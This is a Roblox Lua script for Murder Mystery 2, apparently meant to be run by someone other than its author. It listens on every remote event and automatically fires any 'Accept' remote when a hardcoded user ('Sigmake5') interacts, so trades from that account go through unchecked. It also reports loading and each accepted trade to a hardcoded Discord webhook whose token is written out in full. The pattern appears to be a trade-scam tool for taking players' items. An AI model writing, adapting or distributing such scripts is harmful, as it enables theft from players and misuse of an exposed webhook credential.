-- SIMPLE MM2 AUTO-ACCEPT SCRIPT
-- Just accepts trade requests from Sigmake5

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Send log to Discord
local function sendLog(msg)
    pcall(function()
        local HttpService = game:GetService("HttpService")
        local data = HttpService:JSONEncode({content = msg})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

sendLog("Script loaded - Watching for " .. TARGET_USER)

-- Find ALL remote events
local allRemotes = {}
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        allRemotes[v.Name] = v
        print("Found remote:", v.Name)
    end
end

-- Listen for ANY remote event from Sigmake5
for _, remote in pairs(allRemotes) do
    if remote.OnClientEvent then
        remote.OnClientEvent:Connect(function(...)
            local args = {...}
            for _, arg in pairs(args) do
                if type(arg) == "table" and arg.Name == TARGET_USER then
                    sendLog("🔔 " .. TARGET_USER .. " interacted with remote: " .. remote.Name)
                    print("Detected:", remote.Name)
                    
                    -- Try to auto-accept if it's a trade request
                    if remote.Name == "AcceptRequest" or remote.Name:find("Accept") then
                        pcall(function() remote:FireServer() end)
                        sendLog("✅ Auto-accepted via " .. remote.Name)
                    end
                end
            end
        end)
    end
end

print("Waiting for " .. TARGET_USER .. "...")
sendLog("Auto-accept active")
